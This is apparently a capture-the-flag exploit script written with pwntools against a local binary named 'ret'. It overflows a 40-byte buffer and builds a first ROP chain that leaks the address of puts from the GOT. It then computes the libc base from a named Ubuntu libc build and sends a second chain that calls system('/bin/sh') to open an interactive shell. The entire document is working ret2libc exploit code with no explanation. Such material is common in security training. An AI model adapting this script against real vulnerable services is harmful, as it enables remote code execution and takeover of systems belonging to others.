from pwn import *

elf = ELF("./ret")
rop1 = ROP(elf)
p = elf.process()

context.arch = 'amd64'

OFFSET = 40
"""
OFFSET = b"" # if known, should be set
if OFFSET == b"":
	log.info("Searching for offset")
	p.sendline(cyclic(516,n=8))
	p.wait()
	core = Coredump('./core')
	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
	log.info(f"Offset is {OFFSET}")
"""
print(p.recv())

rop1.call(elf.symbols["puts"], [elf.got['puts']])
rop1.call(elf.symbols["main"])

payload1 = [
	b"A"*OFFSET,
	rop1.chain()
]

payload1 = b"".join(payload1)
p.sendline(payload1)

puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Puts found at {hex(puts)}")


#libc = ELF()
LIBC = "./libc6_2.31-0ubuntu9.2_amd64.so"
libc = ELF(LIBC)

if LIBC:
    libc.address = puts - libc.symbols['puts'] #Save LIBC base
    log.info("LIBC base @ %s" % hex(libc.address))

    # If not LIBC yet, stop here
else:
    log.warning("TO CONTINUE: Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
    p.interactive()
    exit()

rop2 = ROP(libc)
rop2.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop2.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
rop2.call("exit")

payload2 = [
	b"A"*OFFSET,
	rop2.chain()
]

payload2 = b"".join(payload2)

p.sendline(payload2)

p.interactive()
